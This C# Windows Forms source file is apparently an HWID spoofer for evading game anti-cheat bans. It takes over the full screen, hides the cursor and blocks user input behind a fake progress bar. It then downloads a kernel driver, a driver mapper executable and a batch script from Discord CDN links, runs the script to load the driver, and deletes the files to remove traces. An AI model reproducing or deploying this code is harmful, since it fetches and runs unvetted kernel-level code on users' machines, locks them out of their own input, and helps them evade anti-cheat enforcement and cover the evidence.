﻿using HwidSpoofer;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Helix_Spoofer
{
    public partial class Spoofer_BE : Form
    {

        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern void BlockInput([In, MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]

        private static extern IntPtr CreateRoundRectRgn

(
    int nLeftRect,     // x-coordinate of upper-left corner
    int nTopRect,      // y-coordinate of upper-left corner
    int nRightRect,    // x-coordinate of lower-right corner
    int nBottomRect,   // y-coordinate of lower-right corner
    int nWidthEllipse, // height of ellipse
    int nHeightEllipse // width of ellipse
);
        int w = Screen.PrimaryScreen.Bounds.Width;
        int h = Screen.PrimaryScreen.Bounds.Height;


        public Spoofer_BE()
        {
            InitializeComponent();
            this.Location = new Point(0, 0);
            Size = new Size(w, h);
            TopMost = true;
            Cursor.Hide();
            BlockInput(true);
        }

        private void Spoofer_BE_Load(object sender, EventArgs e)
        {

            InitializeComponent();
            this.Location = new Point(0, 0);
            Size = new Size(w, h);
            TopMost = true;
            Cursor.Hide();
            BlockInput(true);


            timer1.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            gunaProgressBar1.Value += 250;




            if (gunaProgressBar1.Value >= 1000)
            {
                cpu.Text = "Pairing with the privileged components...";
                //ignore
            }


            if (gunaProgressBar1.Value >= 2000)
            {
                bios.Text = "Applying hardware serials modifcations...";
                //ignore
            }

            if (gunaProgressBar1.Value >= 4000)
            {
                baseboard.Text = "Disconnecting from the privileged components.";
            }

            if (gunaProgressBar1.Value >= 5000)
            {
                diskdrive.Text = "Cleaning files and registery entries...";
                //put here your load driver and clean traces script
            }

            if (gunaProgressBar1.Value >= 6000)
            {
                swofmac.Text = "Finializing execution with the server...";
                //ignore

                timer1.Enabled = false;


                WebClient webClient = new WebClient();
                webClient.DownloadFile("https://cdn.discordapp.com/attachments/982366473865547837/988832692999192606/EAC_BE.sys", @"C:\Program Files\Epic Games\EAC_BE.sys");
                webClient.DownloadFile("https://cdn.discordapp.com/attachments/969969857082851398/980603333125501038/dlxmap_1.exe", @"C:\Program Files\Epic Games\dlxmap_1.exe");
                webClient.DownloadFile("https://cdn.discordapp.com/attachments/977990594091679855/982304295011643442/driverload.bat", @"C:\Program Files\Epic Games\driverload.bat");


                System.Diagnostics.Process.Start(@"C:\Program Files\Epic Games\driverload.bat");

                System.Threading.Thread.Sleep(700);

                File.Delete(@"C:\Program Files\Epic Games\EAC_BE.sys");
                File.Delete(@"C:\Program Files\Epic Games\dlxmap_1.exe");
                File.Delete(@"C:\Program Files\Epic Games\driverload.bat");
                BlockInput(false);
                Cursor.Show();
                spoofed main = new spoofed();
                main.Show();
                this.Hide();
            }
        }

        private void gunaProgressBar1_ValueChanged(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }
    }
}
